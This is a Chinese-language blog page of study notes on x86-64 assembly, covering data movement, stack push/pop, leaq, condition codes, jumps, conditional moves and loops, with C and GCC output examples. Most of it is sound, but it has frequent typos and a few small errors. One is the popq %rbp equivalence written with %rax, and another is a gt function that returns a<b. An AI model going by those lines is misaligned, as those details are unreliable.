<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mulstore:</span><br><span class="line">    pushq   %rbx</span><br><span class="line">    movq    %rdx,%rbx</span><br><span class="line">    call    mult2</span><br><span class="line">    movq    %rax,(%rbx)</span><br><span class="line">    popq    %rbx</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<p>上面代码中，每个缩进去的行都对应于一条机器指令。比如，<code>pushq</code>指令表示应该将寄存器<code>%rbx</code>压入栈中。</p>
<p>如果按照<code>- c</code>命令行选项，GCC会编译并汇编该代码</p>
<p><code>linux&gt; gcc -Og -c mstore.c</code></p>
<p>这就会产生目标代码文件<code>mstore.o</code>，它是二进制格式的，所以无法直接查看。1368字节的文件<code>mstore.o</code>中有一段14字节的序列，它的16进制表示为</p>
<p><code>53 48 89 d3 e8 00 00 00 00 48 89 03 5b c3</code></p>
<p>这就是上面列出的汇编指令对应的目标代码</p>
<p>综上，我们可以发现，机器执行的程序只是一个字节序列，它是对一系列指令的编码。</p>
<p>要查看机器代码文件的内容，带-d命令行的标志程序OBJDUMP可以充当这个角色</p>
<p><img src="/./3_images/image-2-1737376056789-1-1737379738526-25-1737437293842-19-1737469906157-13-1737469964590-80.png" alt="alt text"></p>
<p>我们可以看到按照前面给出的字节顺序排列的14个16进制字节值，它们分成了若干组，每组1~5个字节。每组字节都已一条指令，右边是等价的汇编语言</p>
<p>一些关于机器代码和它的反汇编表示的特性：</p>
<ul>
<li>x86-64的指令长度从1到15字节不等。常用指令以及操作数较少的指令所需的字节数少</li>
<li>设计指令格式的方式是，从某个给定位置开始，可以将字节唯一解码成机器指令。例如，只有指令<code>pushq %rbx</code>是以字节值53开头的</li>
<li>反汇编器只是基于机器代码文件中的字节序列来确定汇编代码。它不需要访问该层徐的源代码或汇编代码</li>
<li>反汇编使用的命名规则与GCC生成的汇编代码使用的有些细微差别</li>
</ul>
<p>生成实际可执行的代码需要对一组目标代码文件运行连接器，而这一组目标代码文件中必须包含有一个main函数</p>
<h4 id="如何展示程序的字节表示"><a href="#如何展示程序的字节表示" class="headerlink" title="如何展示程序的字节表示"></a><em>如何展示程序的字节表示</em></h4><p>要展示程序的二进制目标代码，用反汇编器确定该过程的代码长度14字节。然后，在文件mstore.o上运行GDB，输入命令</p>
<p><code>(gdb) x/14xb multstore</code></p>
<p>这条命令告诉GDB显示（简写为’x’）从函数multstore所处地址开始的14个十六进制格式表示（也简写为x）的字节（简写为b）</p>
<h3 id="3-2-3-关于格式的注解"><a href="#3-2-3-关于格式的注解" class="headerlink" title="3.2.3 关于格式的注解"></a>3.2.3 关于格式的注解</h3><p>使用<code>- S</code>生成mstore.s文件然后查看，完整内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> .file   &quot;mstore.c&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  multstore</span><br><span class="line">        .type   multstore, @function</span><br><span class="line">multstore:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        endbr64</span><br><span class="line">        pushq   %rbx</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 3, -16</span><br><span class="line">        movq    %rdx, %rbx</span><br><span class="line">        call    mult2@PLT</span><br><span class="line">        movq    %rax, (%rbx)</span><br><span class="line">        popq    %rbx</span><br><span class="line">        .cfi_def_cfa_offset 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   multstore, .-multstore</span><br><span class="line">        .ident  &quot;GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure>

<p>注意，所有以<code>.</code>开头的行都是指导汇编器和连接器工作的伪指令。这些行通常可以忽略。而为了更清楚地说明汇编代码，利用另一种格式编写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void multstore(long x,long y,long *dest)</span><br><span class="line">x in %rdi, y in %rsi, dest in %rdx</span><br><span class="line">multstore:</span><br><span class="line">    pushq   %rbx            Save %rbx</span><br><span class="line">    movq    %rdx,%rbx       Copy dest to %rbx</span><br><span class="line">    call    mult2           Call mult2(x,y)</span><br><span class="line">    movq    %rax,(%rbx)     Store result at *dest</span><br><span class="line">    popq    %rbx            Restore %rbx</span><br><span class="line">    ret                     Return</span><br></pre></td></tr></table></figure>

<h2 id="3-3-数据格式"><a href="#3-3-数据格式" class="headerlink" title="3.3 数据格式"></a>3.3 数据格式</h2><p><img src="/./3_images/image-1737376056790-2-1737379738526-27-1737437293842-20-1737469906156-12-1737469964590-82.png" alt="alt text"></p>
<h2 id="3-4-访问信息"><a href="#3-4-访问信息" class="headerlink" title="3.4 访问信息"></a>3.4 访问信息</h2><p><img src="/./3_images/image-3-1737376056790-3-1737379738526-26-1737437293842-21-1737469906157-14-1737469964590-81.png" alt="alt text"></p>
<h3 id="3-4-1-操作数指示符"><a href="#3-4-1-操作数指示符" class="headerlink" title="3.4.1 操作数指示符"></a>3.4.1 操作数指示符</h3><p>x86-64支持多种操作数格式，源数据值可以以常数形势给出，或是从寄存器或内存中读出。结果可以放在寄存器或内存中</p>
<ul>
<li><strong>立即数</strong>：用来表示常熟值。在ATT格式的汇编代码中，立即数的书写方式是”$”后面跟一个用标准C表示法白哦是的整数，例如$-577。</li>
<li><strong>寄存器</strong>：它表示某个寄存器的内容，16个寄存器的低位1字节、2字节、4字节或8字节中的一个作为操作数，这些字节数分别对应于8位、16位、32位或64位</li>
<li><strong>内存引用</strong>：它会根据计算出来的地址（<em>有效地址</em>）访问某个内存位置。</li>
</ul>
<p><img src="/./3_images/%E6%89%AB%E6%8F%8F%E5%85%A8%E8%83%BD%E7%8E%8B%202025-01-14%2011.39-1737376056790-4-1737379738526-28-1737437293842-22-1737469906157-15-1737469964590-83.jpg" alt="alt text"></p>
<h3 id="3-4-2-数据传送指令"><a href="#3-4-2-数据传送指令" class="headerlink" title="3.4.2 数据传送指令"></a>3.4.2 数据传送指令</h3><h4 id="MOV类"><a href="#MOV类" class="headerlink" title="MOV类"></a>MOV类</h4><p>这些指令把数据从源位置复制到目的为宗旨，不做任何变化。MOV类由4条指令组成：<code>movb</code>,<code>movw</code>,<code>movl</code>,<code>movq</code>。这些指令都执行同样的操作；主要区别在于它们操作的数据大小不同，分别是1、2、4、8字节</p>
<p>源操作数指定的值是一个立即数，存储在寄存器中或者内存中。目的操作数指定一个位置，要么是一个寄存器，要么是一个内存地址。x86-64加了一条限制，传送指令的两个操作数不能都指向内存位置。将一个之从一个内存位置复制大哦另一个内存位置需要两条指令——第一条指令将源值加载到寄存器中，第二条指令将该寄存器值写入目的位置。</p>
<p>大多数情况中，MOV指令只会更i性能目的操作指定的那些寄存器字节或内存位置。粗话了movl指令以寄存器作为目的时，它会把该寄存器的高位4字节设置为0</p>
<p>此外还有两类数据移动指令，在将较小的源值复制到较大的目的时使用，这些指令都是把数据从源（寄存器或内存内）复制到目的寄存器</p>
<h4 id="movz"><a href="#movz" class="headerlink" title="movz"></a><code>movz</code></h4><p>把目的中剩余的字节填充为0</p>
<ul>
<li><code>movzbw</code>:将做了零扩展的字节传送到字</li>
<li><code>movzbl</code>:将做了零扩展的字节传送到双字</li>
<li>……</li>
</ul>
<p>注意不存在把四字节源值零扩展为8字节的指令，这样的数据传送应该用以寄存器为目的的movl指令来实现。这一技术利用的属性是，生成4字节值并以寄存器作为目的的指令会把高4字节置为0.对于64位目标，所有三种源类型都有对应的符号拓展传送，而只有两种较小得源类型有零扩展传送</p>
<h4 id="movs"><a href="#movs" class="headerlink" title="movs"></a><code>movs</code></h4><p>把目的中剩余的字节符号扩展，将源操作的最高位进行复制</p>
<ul>
<li><code>movsbw</code>:将做了符号扩展的字节传送到字</li>
<li>……</li>
<li><code>cltq</code>:把<code>%eax</code>符号扩展到<code>%rax</code></li>
</ul>
<h3 id="3-4-4-压入和弹出栈数据"><a href="#3-4-4-压入和弹出栈数据" class="headerlink" title="3.4.4 压入和弹出栈数据"></a>3.4.4 压入和弹出栈数据</h3><p>最后两个数据传送操作可以将数据压入程序栈中，以及从程序栈中弹出数据。栈是一种数据结构，可以添加或者删除值，不过需要遵循“后进先出”的原则。通过push操作把数据压入栈中，通过pop操作删除数据</p>
<p>它有一个属性：弹出的值永远是最近被压入而且仍然在栈中的值。</p>
<p>x86-64中，栈向下增长，这样一来，栈顶元素的地址是所有栈中元素地址中最低的。</p>
<p><em><strong>栈指针%rsp保存着栈顶元素的地址</strong></em>.</p>
<p><code>pushq</code>将数据压入到栈上，而且<code>popq</code>指令是弹出数据。这些指令都只有一个操作数——压入栈中的数据源和弹出的数据目的(四字)</p>
<p>将一个四字值压入栈中，首先要先将栈指针减八，然后将值写道新的栈顶地址。因此<code>pushq %rbp</code>的行为等价于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subq $8,%rsp        下降栈指针</span><br><span class="line">movq %rbp,(%rsp)    将%rbp存在栈上</span><br></pre></td></tr></table></figure>

<p>它们的区别是在机器代码中pushq指令编码为1个字节，而上面那两条指令一共为8个字节</p>
<p>弹出一个四字的操作包括从栈顶位置读出数据，然后将栈指针加8。因此<code>popq %rbp</code>等价于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq (%rsp),%rax        从栈中读出rax的值</span><br><span class="line">addq $8,%rsp            增加栈指针</span><br></pre></td></tr></table></figure>

<h2 id="3-5-算数和逻辑操作"><a href="#3-5-算数和逻辑操作" class="headerlink" title="3.5 算数和逻辑操作"></a>3.5 算数和逻辑操作</h2><p><img src="/./3_images/25c340a14e67624095448de8509b1e1f-1737376056790-5-1737379738526-29-1737437293843-23-1737469906157-16-1737469964590-86.png" alt="alt text"></p>
<h3 id="3-5-1-加载有效地址"><a href="#3-5-1-加载有效地址" class="headerlink" title="3.5.1 加载有效地址"></a>3.5.1 加载有效地址</h3><p><em>加载有效地址</em>指令<code>leaq</code>实际上是<code>movq</code>指令的变形。它的指令形式式从内存读数据到寄存器，但实际上根本没有引用内存。</p>
<p>它的第一个操作数是将有效地址写入到目的操作数，而不是从指定的位置读入数据，<strong>目的操作数必须是一个寄存器</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">scale</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> t = x + <span class="number">4</span>*y + <span class="number">12</span>*z;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译后<code>leaq</code>指令的实现算术运算</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">long scale(long x, long y, long z)</span><br><span class="line">x in %rdi,y in %rsi,z in %rdx</span><br><span class="line"></span><br><span class="line">scale：</span><br><span class="line">    leaq    (%rdi,%rsi,4),%rax      x + 4*y</span><br><span class="line">    leaq    (%rdx,%rdx,2),%rdx      z + 2*z = 3*z</span><br><span class="line">    leaq    (%rax,%rdx,4),%rax      (x + 4*y) + 4*(3*z) = x + 4*y + 12*z</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h3 id="3-5-2-一元和二元操作"><a href="#3-5-2-一元和二元操作" class="headerlink" title="3.5.2 一元和二元操作"></a>3.5.2 一元和二元操作</h3><p>第二组中的操作是一元操作，只有一个操作数，既是源又是目的。这个操作数可以是一个寄存器，也可以是一个内存位置</p>
<p>第三组是二元操作，其最终，第二个操作数既是源又是目的，第一个操作数可以是立即数、寄存器或是内存位置；第二个操作数可以是寄存器或是内存位置</p>
<p><em>当第二个数为内存地址时，处理器必须从内存中读出值，执行操作，再把结果写回内存</em>.</p>
<h3 id="3-5-3-移位操作"><a href="#3-5-3-移位操作" class="headerlink" title="3.5.3 移位操作"></a>3.5.3 移位操作</h3><p>最后一组是移位操作，先给出移位量，然后第二项给出的是要移位的数。可以进行算数和逻辑右移。移位量可以是一个立即数，或者放在单字节寄存器%cl中</p>
<p>移位量是由%cl寄存器的低m位决定的，这里 <em>2^m&#x3D;w</em> ,高位会被忽略。所以若%cl的十六进制值为0xFF时，指令salb会移7位，salw会移15位，sall会移31位</p>
<h2 id="3-6-控制"><a href="#3-6-控制" class="headerlink" title="3.6 控制"></a>3.6 控制</h2><p>目前我们只考虑了直线代码的行为，也就是指令条接着一条顺序地执行（顺序结构）</p>
<p>机器代码提供两种基本地敌机机制来实现有条件地行为：测试数据值，然后根据测试地结果来改变控制流或者数据流</p>
<h3 id="3-6-1-条件码"><a href="#3-6-1-条件码" class="headerlink" title="3.6.1 条件码"></a>3.6.1 条件码</h3><p>除了整数寄存器，CPU还维护着一组单个位地条件码（condition code）寄存器，它们描述了最近的算数或逻辑操作地属性，可以检测这些寄存器来执行条件分支指令。</p>
<ul>
<li>CF：进位标志.最近的操作使最高位产生了进位。可以用来检查无符号操作的溢出</li>
<li>ZF：零标志。最近的操作得出的结果是0</li>
<li>SF：符号标志。最近的操作得到的结果为负数</li>
<li>OF：溢出标志。最近的操作导致一个补码溢出——正溢出或负溢出</li>
</ul>
<p>比如说，假设我们用一条ADD指令完成等价于C表达式 t &#x3D; a + b的功能，这里变量a、b和t都是整型的。然后根据下面的C表达式来设置条件码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CF  (unsigned) t &lt; (unsigned) a     无符号溢出</span><br><span class="line">ZF  (t == 0)                        零</span><br><span class="line">SF  (t&lt;0)                           负数</span><br><span class="line">OF  (a&lt;0==b&lt;0) &amp;&amp; (t&lt;0!=a&lt;0)        有符号溢出</span><br></pre></td></tr></table></figure>

<ul>
<li><code>leaq</code>指令不会改变任何的条件码，因为它是用来进行地址计算的。</li>
<li>除此之外，之前<code>算数和逻辑操作</code>图表中的所有指令都会设置条件码。</li>
<li>对于移位操作，进位标志将设置为最后一个被移出的位，而溢出标志设置为0。</li>
<li>INC和DEC指令会设置溢出和零标志，但是不会改变进位标志</li>
</ul>
<p>还有两类指令只设置条件码而不改变任何其它寄存器</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>基于</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>cmpb</code> S1,S2</td>
<td>S2-S1</td>
<td>比较字节</td>
</tr>
<tr>
<td><code>testb</code> S1,S2</td>
<td>S1&amp;S2</td>
<td>测试</td>
</tr>
</tbody></table>
<ul>
<li>CMP指令根据两个操作数之差来设置条件码。除了不改变寄存器的值以外，其它行为和SUB是一样的。如果两个操作数相等，这些指令会将零标志设置为1</li>
<li>TEST指令的行为和AND指令一样。典型用法为：两个操作数是一样的（例如，test %rax,%rax来检查%rax是负数、零还是正数），或其中的一个操作数是一个掩码，用来指示哪些位应该被测试</li>
</ul>
<h3 id="3-6-2-访问条件码"><a href="#3-6-2-访问条件码" class="headerlink" title="3.6.2 访问条件码"></a>3.6.2 访问条件码</h3><p>条件码通常不会直接读取，常用的使用方法有3种</p>
<ul>
<li>可以根据条件码的某种组合，将一个字节设置为0或者1</li>
<li>可以条件跳转到程序的某个其它部分</li>
<li>可以有条件的传送数据</li>
</ul>
<p><code>SET</code>指令根据条件码的组合，将某一个字节设置为 0 或者 1 。指令名字后面的后缀指明了他们的功效和需要考虑的条件码组合的不同</p>
<p><img src="/./3_images/image-4-1737376056790-6-1737379738526-30-1737437293843-24-1737469906157-17-1737469964590-84.png" alt="alt text"></p>
<p>SET指令的操作数是8个单字节寄存器之一，或是存储一个字节的存储器位置，然后将这个字节设置为 0 或 1。下面看一个典型的计算C语言表达式 x &gt; y 的指令序列。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gt</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int comp(data_t a,data_t b)</span><br><span class="line">a in %rdi,b in %rsi</span><br><span class="line">cmpq    %rsi,%rdi       # Compare a : b</span><br><span class="line">setl    %al             # Set low-byte of %eax to 0 or 1</span><br><span class="line">movzbl  %al, %eax       # Set remaining bytes of %eax to 0</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>注意<code>cmpq</code>指令的比较顺序。虽然参数列出的顺序是先%rsi(b)再是%rdi(a),但实际上比较的是a和b。以及，<code>movzbl</code>指令会将<code>%eax</code>的高3个字节清零，还会把整个寄存器%rax的高四个字节都清零</p>
<p>注意机器代码如何区分有符号和无符号值是很重要的</p>
<h3 id="3-6-3-跳转指令"><a href="#3-6-3-跳转指令" class="headerlink" title="3.6.3 跳转指令"></a>3.6.3 跳转指令</h3><p><em>jump</em>指令会导致执行切换到程序中一个全新的位置。再汇编代码中，这些跳转的目的地通常用一个标号表明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  movq $0,%rax          Set %rax to 0</span><br><span class="line">  jmp .L                Goto .L1</span><br><span class="line">  movq (%rax),%rdx      Null pointer dereference (skipped)</span><br><span class="line">.L1:</span><br><span class="line">  popq %rdx             ump target</span><br></pre></td></tr></table></figure>

<p>这里<code>jmp .L1</code>指令会使程序跳过<code>movq</code>指令，从<code>popq</code>指令继续执行</p>
<p>在产生目标代码文件时，汇编器会确定所有带标号指令的地址，并将跳转目标（目的指令的地址）编码为跳转指令的一部分</p>
<p><img src="/./3_images/image-5-1737376056790-7-1737379738526-31-1737437293843-25-1737469906157-18-1737469964590-85.png" alt="jump指令"></p>
<h3 id="3-6-4-跳转指令的编码"><a href="#3-6-4-跳转指令的编码" class="headerlink" title="3.6.4 跳转指令的编码"></a>3.6.4 跳转指令的编码</h3><p>在汇编代码中，跳转目标用符号标号书写。汇编器，以及后来的链接器，会产生跳转目标的适当编码。</p>
<p>跳转指令有几种不同的编码，但是最常用的都是PC相对的（PC-relative）。</p>
<p>也就是说，它们会将目标指令的地址与紧跟在跳转指令后面那条指令的地址之间的差作为编码。这些地址偏移量可以编码为1、2或4个字节。</p>
<p>第二种编码方式是给出绝对地址，用4个字节直接指定目标，汇编器和链接器会选择适当的跳转目的编码</p>
<p>当执行PC相对寻址的时候，程序计数器的值是跳转指令后面的那条指令的地址，而不是跳转指令本身的地址</p>
<h3 id="3-6-5-用条件控制来实现条件分支"><a href="#3-6-5-用条件控制来实现条件分支" class="headerlink" title="3.6.5 用条件控制来实现条件分支"></a>3.6.5 用条件控制来实现条件分支</h3><p>将条件表达式和语句从 C 语言翻译成机器代码，最常用的方式是结合有条件和无条件跳转。（另一种方式在 3.6.6 节中会看到，有写条件可以用数据的条件转移实现，而不是用控制的条件转移实现）。</p>
<p><img src="/./3_images/image-7-1737376056790-8-1737379738526-32-1737437293843-26-1737469906157-20-1737469964590-88.png" alt="条件语句的编译"></p>
<p>a） C过程<code>absdiff_se</code>包含一个if-else语句</p>
<p>b） C过程<code>gotodiff_se</code>模拟了<code>goto</code>代码的控制</p>
<p>c）给出了产生的汇编代码</p>
<h3 id="3-6-6-用条件传送来实现条件分支"><a href="#3-6-6-用条件传送来实现条件分支" class="headerlink" title="3.6.6 用条件传送来实现条件分支"></a>3.6.6 用条件传送来实现条件分支</h3><p>实现条件操作的传统方法是通过使用控制的条件转移。当条件满足时，程序沿着一条执行路径执行，而当条件不满足时，就走另一条路径。这种机制简单而通用，但是在现代处理器上，它可能会非常低效</p>
<p>一种替代的策略是使用数据的条件转移。这种方法计算一个条件操作的两种结果，然后再根据条件是否满足从中选取一个。只有在一些受限制的情况这种，这种策略才可行，但是如果可行，就可以用一条简单的条件传送指令来实现它，条件传送指令更符合现代处理器的性能特性。</p>
<img src="./3_images/image-20250121121118590-1737437293843-27-1737469906157-19-1737469964590-89.png" alt="image-20250121121118590" style="zoom:67%;" />

<p>a） C函数<code>absdiff</code>包含一个条件表达式</p>
<p>b） C函数<code>cmovdiff</code>模拟汇编代码操作</p>
<p>c） 给出产生的汇编代码</p>
<img src="./3_images/image-20250117214211596-1737379738525-22-1737437293843-28-1737469906157-21-1737469964590-87.png" alt="条件传送指令" style="zoom:50%;" />

<p>当条件满足时，指令把源值<code>s</code>复制到目的<code>R</code>。</p>
<p>同条件跳转不同，处理器无需预测测试结果就可以执行条件传送。处理器只是读源值（可能是内存中），检查条件码，然后要么更新目的寄存器，要么保持不变。</p>
<p><strong>为了理解如何通过条件数据传输来实现条件操作，考虑下面的条件表达式和赋值的通用形式</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v = test-expr ? then-expr : <span class="keyword">else</span>-expr;</span><br></pre></td></tr></table></figure>

<p>用条件控制转移的标准方法来编译这个表达式会得到如下形式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">if</span> (!test-expr)</span><br><span class="line">    	<span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">	v = then-expr;</span><br><span class="line">	<span class="keyword">goto</span> done;</span><br><span class="line">flase:</span><br><span class="line">	v = <span class="keyword">else</span>-expr;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>

<p>这段代码包含两个代码序列：一个对then-expr求值，另一个对else-expr求值。条件跳转和无条件跳转结合起来使用是为了保证只有一个序列执行</p>
<p>基于条件传送的代码，会对then-expr和else-expr都求值，最终值的选择基于对test-expr的求值，可以用下面的抽象代码描述</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v = then-expr;</span><br><span class="line">ve = <span class="keyword">else</span>-expr;</span><br><span class="line"><span class="keyword">if</span> (!t) v = ve</span><br></pre></td></tr></table></figure>

<p>这个序列中的最后一条语句是用条件传送实现的——只有当测试条件t不满足时，ve的值才会被复制到v中</p>
<p><strong>注意</strong>：不是所有的条件表达式都可以用条件传送来编译。如果两个表达式中的任意一个可能产生错误条件或者副作用，就会导致非法的行为</p>
<p><strong>作为说明，考虑下面的C函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">cread</span><span class="params">(<span class="type">long</span> *xp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (xp ? *xp : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码似乎很适合被编译成使用条件传送，理由是：当指针为空时，将结果设置为0。于是，想当然的有了如下汇编代码（以下是错误演示）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.long cread(long *xp)</span><br><span class="line">.xp in %rdi</span><br><span class="line">cread:</span><br><span class="line">  movq (%rdi),%rax ; v = *xp</span><br><span class="line">  testq %rdi,%rdi ; Test x</span><br><span class="line">  movl $0,%edx ; Set ve = 0</span><br><span class="line">  cmove %rdx, %rax; ; If x==0, v = ve</span><br><span class="line">  ret ; Return v</span><br></pre></td></tr></table></figure>

<p>不过，这个实现是非法的，因为即使当测试为假时，<code>movq</code>指令（第二行）对于xp的简介引用还是发生了，导致一个间接引用空指针的错误。所以必须用分支代码来编译这段代码</p>
<p>编译环境为<code>gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0</code>,编译指令为<code>gcc -Og -S test.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cread:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        endbr64</span><br><span class="line">        testq   %rdi, %rdi</span><br><span class="line">        je      .L3</span><br><span class="line">        movq    (%rdi), %rax</span><br><span class="line">        ret</span><br><span class="line">.L3:</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br></pre></td></tr></table></figure>

<p>使用条件传送也不总是会提高代码的效率。例如，如果 <code>then-expr</code> 或者 <code>else-expr</code> 的求值需要大量的计算，那么当相对应的条件不满足时，这些工作就白费了。编译器必须考虑浪费的计算和由于分支预测错误所造成的性能处罚之间的相对性能</p>
<p>总的来说，条件数据传送提供了一种条件控制转移来实现条件操作的替代策略。它们只能用于非常受限制的情况，但是这些情况还是相当常见的，而且与现代处理器的运行方式更契合。</p>
<h3 id="3-6-7-循环"><a href="#3-6-7-循环" class="headerlink" title="3.6.7 循环"></a>3.6.7 循环</h3><p>C 语言提供了多种循环结构，即 <code>do-while</code>、<code>while</code> 和 <code>for</code>。汇编中没有相应的指令存在，可以用条件测试和跳转组合起来实现循环效果。GCC 和其他汇编器产生的循环代码主要基于两种基本的循环模式。</p>
<ol>
<li><code>do-while</code>循环</li>
</ol>
<p><code>do-while</code>语句的通用形式如下;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    body-statement</span><br><span class="line">    <span class="title function_">while</span> <span class="params">(test-expr)</span></span><br></pre></td></tr></table></figure>

<p>这种通用形式可以被翻译为如下所示的条件和<code>goto</code>语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure>

<p>每次循环，程序会执行循环体里的语句，然后执行测试表达式。如果测试为真，就回去再执行一次循环</p>
<img src="./3_images/image-20250117222703928-1737379738525-23-1737437293843-29-1737469906157-26-1737469964590-90.png" alt="阶乘程序的do-while代码" style="zoom:50%;" />

<ol start="2">
<li><code>while</code>循环</li>
</ol>
<p><code>while</code>语句的通用形式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (test-expr)</span><br><span class="line">    body-statement</span><br></pre></td></tr></table></figure>

<p>第一种翻译方法，称之为跳转到中间，它执行一个无条件跳转跳到循环结尾处的测试，以此来执行初始的测试。翻译为<code>goto</code>代码如下</p>
